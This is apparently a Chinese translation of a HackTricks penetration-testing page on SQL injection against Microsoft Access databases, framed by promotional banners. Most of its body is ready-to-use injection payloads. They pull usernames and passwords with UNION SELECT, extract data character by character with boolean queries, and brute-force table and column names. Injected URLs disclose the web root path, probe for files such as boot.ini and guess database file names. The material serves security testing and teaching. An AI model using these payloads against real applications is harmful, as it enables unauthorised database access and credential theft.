# MS Access SQL 注入

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 在线实验场

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## 数据库限制

### 字符串连接

字符串连接可以使用 `& (%26)` 和 `+ (%2b)` 字符。
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### 评论

MS Access中没有注释，但显然可以使用一个NULL字符来移除查询的最后部分：
```sql
1' union select 1,2 from table%00
```
如果这不起作用，您可以随时修正查询的语法：
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### 堆叠查询

不支持。

### LIMIT

**`LIMIT`** 操作符**未实现**。然而，可以使用 `TOP` 操作符将 SELECT 查询结果限制为**前 N 行表数据**。`TOP` 接受一个整数作为参数，表示要返回的行数。
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
就像 **`TOP`** 一样，你可以使用 **`LAST`** 来获取**从末尾开始的行**。

## UNION 查询/子查询

在 SQLi 中，你通常会想要以某种方式执行新的查询，以从其他表中提取信息。MS Access 总是要求在**子查询或额外查询中指明 `FROM`**。\
因此，如果你想执行 `UNION SELECT`、`UNION ALL SELECT` 或在条件中带括号的 `SELECT`，你总是**需要指明一个带有有效表名的 `FROM`**。\
因此，你需要知道一个**有效的表名**。
```sql
-1' UNION SELECT username,password from users%00
```
### 链接等于 + 子字符串

{% hint style="warning" %}
这将允许你在不需要知道表名的情况下提取当前表的值。
{% endhint %}

**MS Access** 允许使用 **`'1'=2='3'='asd'=false`** 这样的**奇怪语法**。通常 SQL 注入会在 **`WHERE`** 子句中，我们可以利用这一点。

假设你在 MS Access 数据库中发现了一个 SQLi，并且你知道（或猜测）一个**列名是 username**，这就是你想要**提取**的字段。你可以通过使用链接等于技术检查 web 应用程序的不同响应，并且可能使用 **`Mid`** 函数通过**布尔注入**来提取内容，以获取子字符串。
```sql
'=(Mid(username,1,3)='adm')='
```
如果您知道要转储的**表名**和**列名**，您可以使用 `Mid`、`LAST` 和 `TOP` 的组合通过布尔 SQLi **泄露所有信息**：
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### 穷举表名

使用链式等于技术，你也可以**穷举表名**，方法如下：
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
您也可以使用更传统的方法：
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
请随意在在线环境中检查。

* Sqlmap 常见表名：[https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* 还有另一个列表在 [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### 暴力破解列名

您可以使用链式等号技巧来**暴力破解当前列名**：
```sql
'=column_name='
```
或使用**group by**：
```sql
-1' GROUP BY column_name%00
```
或者您可以使用以下方法暴力破解**不同表**的列名：
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### 导出数据

我们已经讨论了[**链式等于技术**](ms-access-sql-injection.md#chaining-equals-+-substring) **用于从当前和其他表中导出数据**。但还有其他方法：
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
### 基于时间

查看 [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### 其他有趣的函数

* `Mid('admin',1,1)` 从位置1开始获取长度为1的子字符串（初始位置为1）
* `LEN('1234')` 获取字符串长度
* `ASC('A')` 获取字符的ascii值
* `CHR(65)` 从ascii值获取字符串
* `IIF(1=1,'a','b')` 如果然后
* `COUNT(*)` 计数项目数量

## 枚举表格

从 [**这里**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) 你可以看到一个查询数据库中表格名称的查询：
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
```markdown
但请注意，通常会遇到**无法访问`MSysObjects`表**的SQL注入情况。

## 文件系统访问

### Web根目录完整路径

了解**web根目录的绝对路径可能有助于进一步的攻击**。如果应用程序错误没有完全隐藏，可以通过尝试从一个不存在的数据库中选择数据来发现目录路径。

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access会响应一个**包含web目录完整路径的错误信息**。

### 文件枚举

以下攻击向量可用于**推断远程文件系统上文件的存在**。如果指定的文件存在，MS Access会触发一个错误信息，告知数据库格式无效：

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

另一种枚举文件的方法是**指定一个database.table项**。**如果**指定的**文件存在**，MS Access会显示一个**数据库格式错误信息**。

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb文件名猜测

可以使用以下查询来推断**数据库文件名(.mdb)**：

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

其中**name\[i]是.mdb文件名**，而**realTable是数据库中存在的表**。尽管MS Access总是会触发一个错误信息，但可以区分无效的文件名和有效的.mdb文件名。

### .mdb密码破解器

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)是一个免费工具，可用于恢复Microsoft Access 95/97/2000/XP或Jet数据库引擎3.0/4.0的主数据库密码。

## 参考资料

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
```
